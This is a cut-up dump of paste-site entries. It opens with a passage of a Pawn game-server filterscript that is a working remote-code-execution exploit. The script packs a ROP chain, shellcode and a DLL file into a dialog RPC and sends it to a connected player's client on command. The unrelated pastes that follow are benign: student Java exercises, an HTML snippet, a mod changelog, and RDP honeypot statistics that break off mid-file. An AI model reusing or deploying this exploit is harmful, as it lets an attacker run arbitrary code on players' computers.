/* 064 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
/* 080 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
/* 096 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
/* 112 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
/* 128 */ 0x20, 0x20, 0x20, 0x20, 0x84, 0x39, 0x86, 0x00
};

new payload2[] =
{
	0x15, 0x27, 0x40, 0x00, // pop ecx gadget
	0x37, 0x00, 0x00, 0x00, // ecx value
	0x8D, 0x2E, 0x40, 0x00, // pop edi gadget
	0x00, 0x60, 0x86, 0x00, // edi value
	0xE6, 0x2E, 0x5B, 0x00, // rep movsd gadget
	0x00, 0x00, 0x00, 0x00, // edi value
	0x00, 0x00, 0x00, 0x00, // esi value
	0x00, 0x60, 0x86, 0x00, // ret to dst
	0x00, 0x00, 0x00, 0x00, // pad
	
	0x8D, 0xA5, 0xD8, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0x3C, 0x2D, 0x18, 0x01, 0x00, 0x00, 0x8B, 0x08, 0x8B,
	0x50, 0x08, 0x8B, 0x70, 0x0C, 0x83, 0xC1, 0x07, 0xC1, 0xE9, 0x03, 0x83, 0xC2, 0x07, 0xC1, 0xEA, 0x03,
	0x29, 0xD1, 0x01, 0xD6, 0x51, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x51, 0x6A, 0x00, 0xA1, 0xA4,
	0x81, 0x85, 0x00, 0xFF, 0xD0, 0x89, 0xC7, 0x59, 0xF3, 0xA4, 0xFF, 0xD0, 0x5F, 0x5E, 0xB8, 0x01, 0x00,
	0x00, 0x00, 0x5B, 0x89, 0xEC, 0x5D, 0xC2, 0x08, 0x00
};


new BitStream:payload_bs;

new payload_array[21111];

public OnFilterScriptInit()
{
	payload_bs = BS_New();
    BS_WriteUint16(payload_bs, 1); // dialog id
	BS_WriteUint8(payload_bs, DIALOG_STYLE_LIST); // style
	BS_WriteUint8(payload_bs, sizeof(payload2)); // caption length
	for(new i = 0; i < sizeof(payload2); i++) // caption
	{
		BS_WriteUint8(payload_bs, payload2[i]);
	}
	BS_WriteString8(payload_bs, """"); // left button
	BS_WriteString8(payload_bs, """"); // right button
	BS_WriteCompressedString(payload_bs, payload1); // text

	// align
	new offset;
	BS_GetWriteOffset(payload_bs, offset);
	BS_SetWriteOffset(payload_bs, PR_BYTES_TO_BITS(PR_BITS_TO_BYTES(offset)));

	// dll
	new File:fi = fopen(""test.asi"");
	new payload_len = flength(fi);
	if(payload_len > sizeof(payload_array) * 4)
	{
	    printf(""ERROR! Not enough space to read! %d needed"", payload_len / 4);
	}
	else
	{
		fblockread(fi, payload_array);
	    printf(""SUCC READ PAYLOAD of %d bytes"", payload_len);
		for(new i = 0; i < payload_len / 4; i++)
		{
		    BS_WriteUint32(payload_bs, payload_array[i]);
		}
	}
	fclose(fi);
}

public OnFilterScriptExit()
{
	BS_Delete(payload_bs);
}

public OnPlayerCommandText(playerid, cmdtext[])
{
	if(!strcmp(""/aasd1"", cmdtext, true))
	{
		PerformRCE(playerid);
		return 1;
	}
	return 0;
}

PerformRCE(playerid)
{
    SetPlayerGravity(playerid, Float:0x3C658B90);
    PR_SendRPC(payload_bs, playerid, RPC_ShowDialog, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
    HidePlayerDialog(playerid);
    SetPlayerGravity(playerid, 0.008);
}

SetPlayerGravity(playerid, Float:gravity)
{
	new BitStream:bs = BS_New();
	BS_WriteFloat(bs, gravity);
	PR_SendRPC(bs, playerid, RPC_ScrSetGravity, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
	BS_Delete(bs);
}

HidePlayerDialog(playerid)
{
	new BitStream:bs = BS_New();
    BS_WriteUint16(bs, -1); // id
	BS_WriteUint8(bs, DIALOG_STYLE_MSGBOX); // style
	BS_WriteString8(bs, "" ""); // caption
	BS_WriteString8(bs, """"); // left button
	BS_WriteString8(bs, """"); // right button
	BS_WriteCompressedString(bs, "" ""); // text
	PR_SendRPC(bs, playerid, RPC_ShowDialog, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
	BS_Delete(bs);
}
"
qdPMYSbx,Drippin,psychoticodes,HTML,Saturday 24th of February 2024 06:32:22 PM CDT,"<link href=""https://dl.dropboxusercontent.com/s/o9lba1tt2e330jk/drippin.css?dl=0"" rel=""stylesheet""><div id=""drippin"" style=""--width:550px;--back:#080808;--border:#fff""><div class=""dprn""><div class=""drti"">Título vai aqui</div></div><div class=""dpbox"">Seu texto</div></div>"
VE1B5vWi,task3Methods2,psychotrance,Java,Saturday 24th of February 2024 06:32:12 PM CDT,"import java.util.Scanner;
/*
Вычислите факториал введенного с клавиатуры целого числа, используя
рекурсивный алгоритм.
 */


public class task3 {
    public static void main(String[] args) {
        Scanner in = new Scanner(System.in);

        System.out.println(findFactorial(requireNum(in)));
    }

    static int requireNum(Scanner in) {
        int num = in.nextInt();
        return num;
    }

    static int findFactorial(int x) {
        if (x == 0) {
            return 1;
        }
        if (x == 1) {
            return 1;
        }
        return x * findFactorial(x - 1);
    }
}"
n4h5H5ic,task1methods2,psychotrance,Java,Saturday 24th of February 2024 06:30:32 PM CDT,"///*
//Написать программу, которая объединяет любое количество строк, объединяя их
//через пробел. Реализацию конкатенации строк вынести в отдельный метод.
// */

import java.util.Scanner;

public class task1 {
    public static void main(String[] args) {

        Scanner in = new Scanner(System.in);

        System.out.print(requirelane(in));

        in.close();
    }

    static String addSpace() {
        String space = "" "";

        return space;
    }

    static String requirelane(Scanner in) {

        String result = """";

        for (int i = 0; i < 1; ) {
            System.out.print(""Say something: "");
            String answer = in.nextLine();

            if (answer == """")
                i++;
            else {
                result += answer + addSpace();
            }
        }
        return result;
    }
    /*
     а я тут (простите меня за мой французский) изъёбываюсь
     думаю, как же через ввод в консоли всё это сделать
     а тут зашел в комментарии к уроку и смотю - тип там все делает вручную main((((
    */
}
"
Jq9Dpf5G,task3Methods,psychotrance,Java,Saturday 24th of February 2024 06:28:50 PM CDT,"import java.util.Scanner;
/*
Написать программу, которая принимает длину и ширину прямоугольника (2 целых числа).
Нарисовать в консоли заданный прямоугольник, используя “-“ и “|”.
Углы прямоугольника обозначить символом “ “.
Каждая единица длины должна обозначаться одним символом “-“, каждая единица ширины – символом “|“.
Произвести декомпозицию по своему усмотрению.
Рекомендую скинуть на проверку.
Контакт ниже.
 */
public class task3Methods {
    public static void main(String[] args) {

        Scanner in = new Scanner(System.in);

        System.out.print(""Enter a length: "");
        int length = in.nextInt();

        System.out.print(""Enter a width: "");
        int width = in.nextInt();

        in.close();

        System.out.print(doHorisontalLine(length));
        System.out.print(doVerticalLines(length, width));

    }

    static String doHorisontalLine(int a) {
        if (a < 1) {
            a *= -1;
        }
        String horisontalLine = "" "";

        for (int i = 0; i < a; i++) {
            horisontalLine += ""-"";
        }
        horisontalLine += "" \n"";
        return horisontalLine;
    }

    static String doVerticalLines(int a, int b) {
        if (a < 1) {
            a *= -1;
            if (b < 1) {
                b *= -1;
            }
        }
        String verticalLines = """";

        for (int j = 0; j < b; j++) {
            doVerticalLine(a);
            verticalLines += doVerticalLine(a);
        }
        verticalLines += doHorisontalLine(a);
        return verticalLines;
    }

    static String doVerticalLine(int a) {
        if (a < 1) {
            a *= -1;
        }
        String verticalLine = ""|"";

        for (int i = 0; i < a; i++) {
            verticalLine += "" "";
        }
        verticalLine += ""|\n"";
        return verticalLine;
    }

    /*
    Катастрофически сильно надеюсь на то, что это всё именно то,
    что ты хотел получить в этом задании.
    Весь код собирал вручную с нуля,
    ниоткуда не копировал готовое решение)
    В этот раз даже получилось гораздо проще,
    по ощущениям)
    */
}
"
gqJ28CJP,task2Methods,psychotrance,Java,Saturday 24th of February 2024 06:28:01 PM CDT,"import java.util.Scanner;
    /*
    Декомпозировать задачу
    https://github.com/KFalcon2022/practical-tasks/blob/master/src/com/walking/lesson3_casts_conditional_constructions/Task4.java
    Вынести в отдельный метод логику, которая отрабатывает,
    когда первое число кратно и двум, и трем.
     */


/**
 * Ввести с клавиатуры два целых числа.
 * Если первое – четное ИЛИ второе – кратно трем,
 * вывести в консоль результат сравнения этих чисел.
 * <p>
 * Если первое число кратно и двум, и трем – вывести на экран число один,
 * возведенное в степень N, где N – второе число.
 * Для возведения в степень можно использовать Math.pow().
 * В случае, если результат выражения выходит за пределы типа int
 * (допустимые значения - [-2147483648; 2147483647]) –
 * вывести сообщение «Результат выражения слишком большой!»
 * <p>
 * Также максимальное и минимальное значение int содержится в константах
 * Integer.MIN_VALUE и Integer.MAX_VALUE соответственно.
 */
public class task2Decomposition {
    public static void main(String[] args) {
//        Создаем сканер для чтения с клавиатуры
        Scanner scanner = new Scanner(System.in);

//        Выводим сообщение ""Enter a: "" в консоль.
//        Данное сообщение не является обязательным, лишь информирует пользователя,
//        какое действие от него ожидается
        System.out.print(""Enter a: "");
//        Объявляем переменную a типа int и записываем в нее значение, введенное с клавиатуры
        int a = scanner.nextInt();

//        Повторяем те же действия для b
        System.out.print(""Enter b: "");
        int b = scanner.nextInt();
//        Сканер более не используется, ее необходимо закрыть.
//        Зачем - разберемся, когда будем изучать I/O Streams
        scanner.close();

        doCompare(a, b);
        doAction(a, b);

    }

    static void doCompare(int a, int b) {

//        Если а - четное ИЛИ b - кратно трем
        if (a % 2 == 0 || b % 3 == 0) {
            System.out.println(a == b);
        }
    }

    static double doAction(int a, int b) {

        double result = 0;

        if (a % 2 == 0 && a % 3 == 0) {    // Данную проверку можно оптимизировать как a % 6 == 0
//            Записываем в переменную result результат возведения a в степень b
//            Тип double был использован, потому что Math.pow() возвращает именно его.
//            В остальном нам подошел бы и long
            result = (double)Math.pow(a, b);

            //            Если результат превышает допустимые размеры для int
            if (result > Integer.MAX_VALUE || result < Integer.MIN_VALUE) {
                System.out.println(""Результат выражения слишком большой!"");
            } else {    //в ином случае
//                Каст к int необязателен, но позволяет избежать выведения в консоль дробной части
                System.out.println((int) result);
            }
        } return result;
    }
    /*
     * Примечание. Если мы попытаемся протестировать нашу программу
     * на максимально допустимых значениях: a == 2147483646 (максимальное для инта, кратное 6)
     * и b == 2147483647, результатом будет ""infinity"" - мы выйдем за пределы вместимости double.
     * Однако это не программе отработать корректно: все что угодно меньше, чем бесконечность:)
     */
} /*
честно говоря, не совскм понял, как у меня получилось то, что получилось)
так же было катастрофически сложно
но, если это было то, что ты задумал, то я очень рад
*/"
f1UhuFmX,task1Methods,psychotrance,Java,Saturday 24th of February 2024 06:26:39 PM CDT,"import java.util.Scanner;
/*
Декомпозировать задачу
Вынести в отдельный метод использование switch-case.
Также вынести в отдельный метод использование System.out.println
 */




/**
 * Написать программу, которая принимает строку с клавиатуры.
 * Если строка == ""Hi"" - вывести в консоль ""Hello"",
 * если Bye - Good bye,
 * если How are you - How are your doing.
 * Если любая другая строка - вывести Unknown message.
 * Сделать через switch-case
 */
public class task1decomposition {
    public static void main(String[] args) {
//        Создаем сканер для чтения с клавиатуры
        Scanner scanner = new Scanner(System.in);

//        Выводим сообщение ""Enter string: "" в консоль.
//        Данное сообщение не является обязательным, лишь информирует пользователя,
//        какое действие от него ожидается
        System.out.print(""Enter string: "");
//        Объявляем переменную s типа String и записываем в нее значение, введенное с клавиатуры
        String s = scanner.nextLine();

//        Сканер более не используется, ее необходимо закрыть.
//        Зачем - разберемся, когда будем изучать I/O Streams
        scanner.close();

        String x = doAnswer(s);
        answer(x);
    }

    static String doAnswer(String s) {

//        Используем конструкцию switch-case для переменной s
        switch (s) {
            case ""Hi"":  // Если s равно ""Hi""
//                Выводим в консоль ""Hello""
                return ""Hello"";
//                Вызываем оператор break, чтобы выйти из switch-case


            case ""Bye"":
                return ""Good bye"";
            case ""How are you"":
                return ""How are you doing?"";

            default:  // Если значение s не совпадает ни с одним кейсом
                return ""Unknown message"";
        }
    }

    static void answer(String ans) {
        System.out.println(ans);
    }

    /*
    Изматерился блин весь
    4 часа думал, как реализовать отдельным методом вывод в консоль
    Все один метод пытался во второй засунуть
    Или же во время вызова вызвать метод, в котором другой метод.
    Если вдруг моя задумка верна, но реализация никакая
    Направь же меня рукою своей
    Ибо я задолбался
    А декомпозировать еще минимум 2 задачи(
     */
}"
GZEjDEaQ,BWR - Changelog 24/02/24,SSilver,Diff,Saturday 24th of February 2024 06:19:46 PM CDT,"Voice Command
- Removed ""Sniper Ahead"" decal above players
Decal was seen as superfluous by players.

Afterburn
~ Fixed bug where afterburn persitting after death
Syringe Gun
~ Fixed missing flinching on hit
Improving some inconsistent behavior.

Back Scatter
+ Increased reload on kill to +2 from reserve
~ Your clip can roll over your clip limit to 8 max
Improving the reward to better help the weapon allow Scout to continue a streak in exchange for his limited range and base clip.

Phlogistinator
+ Added 3 second speed boost after MMMPH taunt
~ Removed uber effects persisting if MMMPH taunt is cancelled early
Without the bonus damage it was seen as needing some additional bonus. A speed boost to help close the gap was added to help close the gap without airblast jumps and get the most of your minicrits.

Pain Train
+ Changed: Speed boost provided for killing any enemy on a capture point (regardless of actual in-game defense event)
- Changed: Max Health penalty replaced with 10% damage vulnerability on wearer
This change should make gaining the boost against enemies on the objective more frequent, with the damage vulnerability making the health loss more consistent between Soldier and Demo.

Vaccinator
- Medic is not granted healing from his own Uber bubbles
On top of his existing regen and the resistance bubbles, the added healing from the uber was too intense. This should make Medic easier to pick off when isolated with the vaccinator.

Machina
+ Removed slower charge speed
- Removed charged damage bonus
Current build was seen as just not enjoyable, it it's been reverted while a different upside is being considered.

Brass Beast
- Changed damage resistance while revved to only work if damage taken would leave you under 90% HP
- Added: -1 to capture rate
The resistance change will make the heavy less tanky when stacked with overheal, only factoring in past that buff. The capture rate buff is also meant to cement the weapon as a more defensive weapon, being incapable of pushing a cart oneself and not contributing on a control point.

Loch-n-Load
+ Added +15% damage to players
- Removed mini-crits against players launched airborne
Current edition was seen as needed an additional boost. This slight damage buff will make picking off healthier targets buffed with overheal or with certain resistances slightly faster, while the airborne countering buff was not very useful aside from punishing jumpers."
SY66ut5V,2024-02-24_stats.json,rdp_snitch,JSON,Saturday 24th of February 2024 06:18:01 PM CDT,"{
  ""ip"": {
    ""185.242.226.23"": 3,
    ""194.169.175.21"": 3,
    ""103.236.108.237"": 3,
    ""45.227.254.8"": 6,
    ""173.239.214.231"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""167.94.138.126"": 3,
    ""143.110.172.155"": 12,
    ""194.165.16.10"": 6,
    ""198.235.24.238"": 9,
    ""51.158.205.47"": 3,
    ""87.251.75.145"": 12,
    ""62.204.41.107"": 12,
    ""80.66.88.211"": 3,
    ""185.170.144.3"": 3,
    ""103.47.194.205"": 3,
    ""205.210.31.99"": 9,
    ""120.240.145.8"": 3,
    ""185.129.51.9"": 12,
    ""193.201.9.48"": 9,
    ""87.251.75.120"": 6,
    ""2.57.149.186"": 6,
    ""165.227.4.41"": 12,
    ""138.68.52.67"": 3,
    ""37.114.57.42"": 6,
    ""123.56.20.194"": 21,
    ""152.32.207.88"": 3,
    ""198.235.24.78"": 9,
    ""216.24.210.142"": 3,
    ""87.251.75.64"": 3,
    ""27.184.195.229"": 3,
    ""205.210.31.217"": 9,
    ""129.226.211.119"": 3,
    ""179.60.150.59"": 3
  },
  ""asn"": {
    ""AS202425"": 3,
    ""AS209605"": 3,
    ""AS132925"": 3,
    ""AS267784"": 6,
    ""AS62240"": 6,
    ""AS208046"": 18,
    ""AS398324"": 3,
    ""AS14061"": 27,
    ""AS48721"": 6,
    ""AS396982"": 36,
    ""AS12876"": 3,
    ""AS208091"": 24,
    ""AS59425"": 12,
    ""AS197414"": 3,
    ""AS140832"": 3,
    ""AS56040"": 3,
    ""AS200532"": 12,
    ""AS49505"": 9,
    ""AS208312"": 6,
    ""AS48314"": 6,
    ""AS37963"": 21,
    ""AS135377"": 3,
    ""AS4134"": 3,
    ""AS132203"": 3,
    ""AS211179"": 3
  },
  ""isp"": {
    ""IP Volume inc"": 3,
    ""UAB Host Baltic"": 3,
    ""Ideastack Solutions Private Limited"": 3,
    ""Flyservers S.A."": 12,
    ""LogicWeb Inc."": 3,
    ""ColocationX Ltd."": 18,
    ""Censys, Inc."": 3,
    ""DigitalOcean, LLC"": 27,
    ""Google LLC"": 36,
    ""Online S.A.S."": 3,
    ""Xhost Internet Solutions LP"": 24,
    ""Horizon LLC"": 12,
    ""Xhost Internet Solutions"": 3,
    ""FTECH"": 3,
    ""China Mobile communications corporation"": 3,
    ""LLP \""Kompaniya Hoster.KZ\"""": 12,
    ""OOO \""Network of data-centers \""Selectel\"""": 9,
    ""Red Byte LLC"": 6,
    ""Michael Sebastian Schinzel trading as IP-Projects GmbH & Co. KG"": 6,
    ""Hangzhou Alibaba Advertising Co"": 21,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Clouvider Limited"": 3,
    ""Chinanet"": 3,
    ""Tencent Cloud Computing (Beijing) Co"": 3,
    ""Veraton Projects LTD"": 3
  },
  ""org"": {
    ""AI Spera"": 3,
    ""EmanuelHosting LTD"": 3,
    ""Ideastack solutions private limited"": 3,
    ""UAB Host Baltic"": 6,
    ""NSQ-VENTURE"": 3,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""Censys, Inc"": 3,
    ""DigitalOcean, LLC"": 27,
    ""Flyservers S.A"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Scaleway"": 3,
    ""Xhost Internet Solutions"": 21,
    ""Horizon LLC"": 12,
    ""XHOSTIS"": 3,
    ""Xhostis"": 3,
    ""Unknown"": 3,
    ""China Mobile"": 3,
    ""Hosterkz Network"": 12,
    ""Chang Way Technologies Co. Limited"": 15,
    ""HosterAPI"": 6,
    ""Aliyun Computing Co., LTD"": 21,
    ""Ucloud Information Technology"": 3,
    ""IPXO"": 3,
    ""Chinanet HE"": 3,
    ""Aceville Pte.ltd"": 3,
    ""Maxwell Group LTD"": 3
  },
  ""regionName"": {
    ""North Holland"": 36,
    ""Kaunas"": 9,
    ""Karnataka"": 3,
    ""Vilnius"": 6,
    ""New Jersey"": 3,
    ""Virginia"": 12,
    ""Michigan"": 3,
    ""England"": 12,
    ""California"": 54,
    ""\u00cele-de-France"": 3,
    ""Moscow"": 12,
    ""Drenthe"": 3,
    ""Thanh H\u00f3a Province"": 3,
    ""Guangdong"": 3,
    ""Karaganda"": 12,
    ""St.-Petersburg"": 9,
    ""Lesser Poland"": 6,
    ""Hesse"": 6,
    ""Beijing"": 21,
    ""Hebei"": 3,
    ""Central Singapore"": 3,
    ""Distrito Federal"": 3
  },
  ""country"": {
    ""The Netherlands"": 39,
    ""Lithuania"": 15,
    ""India"": 3,
    ""United States"": 72,
    ""United Kingdom"": 12,
    ""France"": 3,
    ""Russia"": 21,
    ""Vietnam"": 3,
    ""China"": 27,
    ""Kazakhstan"": 12,
    ""Poland"": 6,
    ""Germany"": 6,
    ""Singapore"": 3,
    ""Venezuela"": 3
  },
  ""account"": {
    ""nmap"": 3,
    ""Administr"": 39,
    ""hello"": 60,
    ""Test"": 18,
    ""(empty)"": 15,
    ""Domain"": 33,
    ""EmNbQnTFa"": 3,
    ""fqVkOY"": 3,
    ""PwiIMJ"": 3,
    ""masscan"": 3,
    ""JewUbdeSz"": 3,
    ""MrwidD"": 3,
    ""BWhQrD"": 3,
    ""x4cl5mhf"": 12,
    ""beio"": 3,
    ""Administrator"": 3,
    ""NtOifCTve"": 3,
    ""fKSdtw"": 3,
    ""vxWrzn"": 3,
    ""dlppmdrvA"": 3,
    ""jXgLPw"": 3,
    ""wRvWWn"": 3
  },
  ""keyboard"": {
    ""Unknown"": 225
  },
  ""client_build"": {
    ""Unknown"": 225
  },
  ""client_name"": {
    ""Unknown"": 225
  },
  ""ip_type"": {
    ""Unknown"": 93,
    ""hosting & proxy"": 27,
    ""mobile"": 12,
    ""hosting"": 90,
    ""mobile & hosting & proxy"": 3
  }
}"
sKHm4qQ6,2024-02-24_stats.json,rdp_snitch,JSON,Saturday 24th of February 2024 06:16:06 PM CDT,"{
  ""ip"": {
    ""185.242.226.23"": 2,
    ""194.169.175.21"": 2,
    ""103.236.108.237"": 2,
    ""45.227.254.8"": 4,
    ""173.239.214.231"": 2,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""167.94.138.126"": 2,
    ""143.110.172.155"": 8,
    ""194.165.16.10"": 4,
    ""198.235.24.238"": 6,
    ""51.158.205.47"": 2,
    ""87.251.75.145"": 8,
    ""62.204.41.107"": 8,
    ""80.66.88.211"": 2,
    ""185.170.144.3"": 2,
    ""103.47.194.205"": 2,
    ""205.210.31.99"": 6,
    ""120.240.145.8"": 2,
    ""185.129.51.9"": 8,
    ""193.201.9.48"": 6,
    ""87.251.75.120"": 4,
    ""2.57.149.186"": 4,
    ""165.227.4.41"": 8,
    ""138.68.52.67"": 2,
    ""37.114.57.42"": 4,
    ""123.56.20.194"": 14,
    ""152.32.207.88"": 2,
    ""198.235.24.78"": 6,
    ""216.24.210.142"": 2,
    ""87.251.75.64"": 2,
    ""27.184.195.229"": 2,
    ""205.210.31.217"": 6,
    ""129.226.211.119"": 2,
    ""179.60.150.59"": 2
  },
  ""asn"": {
    ""AS202425"": 2,
    ""AS209605"": 2,
    ""AS132925"": 2,
    ""AS267784"": 4,
    ""AS62240"": 4,
    ""AS208046"": 12,
    ""AS398324"": 2,
    ""AS14061"": 18,
    ""AS48721"": 4,
    ""AS396982"": 24,
    ""AS12876"": 2,
    ""AS208091"": 16,
    ""AS59425"": 8,
    ""AS197414"": 2,
    ""AS140832"": 2,
    ""AS56040"": 2,
    ""AS200532"": 8,
    ""AS49505"": 6,
    ""AS208312"": 4,
    ""AS48314"": 4,
    ""AS37963"": 14,
    ""AS135377"": 2,
    ""AS4134"": 2,
    ""AS132203"": 2,
    ""AS211179"": 2
  },
  ""isp"": {
    ""IP Volume inc"": 2,
    ""UAB Host Baltic"": 2,
    ""Ideastack Solutions Private Limited"": 2,
    ""Flyservers S.A."": 8,
    ""LogicWeb Inc."": 2,
    ""ColocationX Ltd."": 12,
    ""Censys, Inc."": 2,
    ""DigitalOcean, LLC"": 18,
    ""Google LLC"": 24,
    ""Online S.A.S."": 2,
    ""Xhost Internet Solutions LP"": 16,
    ""Horizon LLC"": 8,
    ""Xhost Internet Solutions"": 2,
    ""FTECH"": 2,
    ""China Mobile communications corporation"": 2,
    ""LLP \""Kompaniya Hoster.KZ\"""": 8,
    ""OOO \""Network of data-centers \""Selectel\"""": 6,
    ""Red Byte LLC"": 4,
    ""Michael Sebastian Schinzel trading as IP-Projects GmbH & Co. KG"": 4,
    ""Hangzhou Alibaba Advertising Co"": 14,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Clouvider Limited"": 2,
    ""Chinanet"": 2,
    ""Tencent Cloud Computing (Beijing) Co"": 2,
    ""Veraton Projects LTD"": 2
  },
  ""org"": {
    ""AI Spera"": 2,
    ""EmanuelHosting LTD"": 2,
    ""Ideastack solutions private limited"": 2,
    ""UAB Host Baltic"": 4,
    ""NSQ-VENTURE"": 2,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Censys, Inc"": 2,
    ""DigitalOcean, LLC"": 18,
    ""Flyservers S.A"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Scaleway"": 2,
    ""Xhost Internet Solutions"": 14,
    ""Horizon LLC"": 8,
    ""XHOSTIS"": 2,
    ""Xhostis"": 2,
    ""Unknown"": 2,
    ""China Mobile"": 2,
    ""Hosterkz Network"": 8,
    ""Chang Way Technologies Co. Limited"": 10,
    ""HosterAPI"": 4,
    ""Aliyun Computing Co., LTD"": 14,
    ""Ucloud Information Technology"": 2,
    ""IPXO"": 2,
    ""Chinanet HE"": 2,
    ""Aceville Pte.ltd"": 2,
    ""Maxwell Group LTD"": 2
  },
  ""regionName"": {
    ""North Holland"": 24,
    ""Kaunas"": 6,
    ""Karnataka"": 2,
    ""Vilnius"": 4,
    ""New Jersey"": 2,
    ""Virginia"": 8,
    ""Michigan"": 2,
    ""England"": 8,
    ""California"": 36,
    ""\u00cele-de-France"": 2,
    ""Moscow"": 8,
    ""Drenthe"": 2,
    ""Thanh H\u00f3a Province"": 2,
    ""Guangdong"": 2,
    ""Karaganda"": 8,
    ""St.-Petersburg"": 6,
    ""Lesser Poland"": 4,
    ""Hesse"": 4,
    ""Beijing"": 14,
    ""Hebei"": 2,
    ""Central Singapore"": 2,
    ""Distrito Federal"": 2
  },
  ""country"": {
    ""The Netherlands"": 26,
    ""Lithuania"": 10,
    ""India"": 2,
    ""United States"": 48,
    ""United Kingdom"": 8,
    ""France"": 2,
    ""Russia"": 14,
    ""Vietnam"": 2,
    ""China"": 18,
    ""Kazakhstan"": 8,
    ""Poland"": 4,
    ""Germany"": 4,
    ""Singapore"": 2,
    ""Venezuela"": 2
  },
  ""account"": {
    ""nmap"": 2,
    ""Administr"": 26,
    ""hello"": 40,
    ""Test"": 12,
    ""(empty)"": 10,
    ""Domain"": 22,
    ""EmNbQnTFa"": 2,
    ""fqVkOY"": 2,
    ""PwiIMJ"": 2,
    ""masscan"": 2,
    ""JewUbdeSz"": 2,
    ""MrwidD"": 2,
    ""BWhQrD"": 2,
    ""x4cl5mhf"": 8,
    ""beio"": 2,
    ""Administrator"": 2,
    ""NtOifCTve"": 2,
    ""fKSdtw"": 2,
    ""vxWrzn"": 2,
    ""dlppmdrvA"": 2,
    ""jXgLPw"": 2,
    ""wRvWWn"": 2
  },
  ""keyboard"": {
    ""Unknown"": 150
  },
  ""client_build"": {
    ""Unknown"": 150
  },
  ""client_name"": {
    ""Unknown"": 150
  },
  ""ip_type"": {
    ""Unknown"": 62,
    ""hosting & proxy"": 18,
    ""mobile"": 8,
    ""hosting"": 60,
    ""mobile & hosting & proxy"": 2
  }
}"
P19F5jKb,2024-02-24_stats.json,rdp_snitch,JSON,Saturday 24th of February 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""185.242.226.23"": 1,
    ""194.169.175.21"": 1,
    ""103.236.108.237"": 1,
    ""45.227.254.8"": 2,
    ""173.239.214.231"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""167.94.138.126"": 1,
    ""143.110.172.155"": 4,
    ""194.165.16.10"": 2,
    ""198.235.24.238"": 3,
    ""51.158.205.47"": 1,
    ""87.251.75.145"": 4,
    ""62.204.41.107"": 4,
    ""80.66.88.211"": 1,
    ""185.170.144.3"": 1,
    ""103.47.194.205"": 1,
    ""205.210.31.99"": 3,
    ""120.240.145.8"": 1,
    ""185.129.51.9"": 4,
    ""193.201.9.48"": 3,
    ""87.251.75.120"": 2,
    ""2.57.149.186"": 2,
    ""165.227.4.41"": 4,
    ""138.68.52.67"": 1,
    ""37.114.57.42"": 2,
    ""123.56.20.194"": 7,
    ""152.32.207.88"": 1,
    ""198.235.24.78"": 3,
    ""216.24.210.142"": 1,
    ""87.251.75.64"": 1,
    ""27.184.195.229"": 1,
    ""205.210.31.217"": 3,
    ""129.226.211.119"": 1,
    ""179.60.150.59"": 1
  },
  ""asn"": {
    ""AS202425"": 1,
    ""AS209605"": 1,
    ""AS132925"": 1,
    ""AS267784"": 2,
    ""AS62240"": 2,
    ""AS208046"": 6,
    ""AS398324"": 1,
    ""AS14061"": 9,
    ""AS48721"": 2,
    ""AS396982"": 12,
    ""AS12876"": 1,
    ""AS208091"": 8,
    ""AS59425"": 4,
    ""AS197414"": 1,
    ""AS140832"": 1,
    ""AS56040"": 1,
    ""AS200532"": 4,
    ""AS49505"": 3,
    ""AS208312"": 2,
    ""AS48314"": 2,
    ""AS37963"": 7,
    ""AS135377"": 1,
    ""AS4134"": 1,
    ""AS132203"": 1,
    ""AS211179"": 1
  },
  ""isp"": {
    ""IP Volume inc"": 1,
    ""UAB Host Baltic"": 1,
    ""Ideastack Solutions Private Limited"": 1,
    ""Flyservers S.A."": 4,
    ""LogicWeb Inc."": 1,
    ""ColocationX Ltd."": 6,
    ""Censys, Inc."": 1,
    ""DigitalOcean, LLC"": 9,
    ""Google LLC"": 12,
    ""Online S.A.S."": 1,
    ""Xhost Internet Solutions LP"": 8,
    ""Horizon LLC"": 4,
    ""Xhost Internet Solutions"": 1,
    ""FTECH"": 1,
    ""China Mobile communications corporation"": 1,
    ""LLP \""Kompaniya Hoster.KZ\"""": 4,
    ""OOO \""Network of data-centers \""Selectel\"""": 3,
    ""Red Byte LLC"": 2,
    ""Michael Sebastian Schinzel trading as IP-Projects GmbH & Co. KG"": 2,
    ""Hangzhou Alibaba Advertising Co"": 7,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Clouvider Limited"": 1,
    ""Chinanet"": 1,
    ""Tencent Cloud Computing (Beijing) Co"": 1,
    ""Veraton Projects LTD"": 1
  },
  ""org"": {
    ""AI Spera"": 1,
    ""EmanuelHosting LTD"": 1,
    ""Ideastack solutions private limited"": 1,
    ""UAB Host Baltic"": 2,
    ""NSQ-VENTURE"": 1,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Censys, Inc"": 1,
    ""DigitalOcean, LLC"": 9,
    ""Flyservers S.A"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Scaleway"": 1,
    ""Xhost Internet Solutions"": 7,
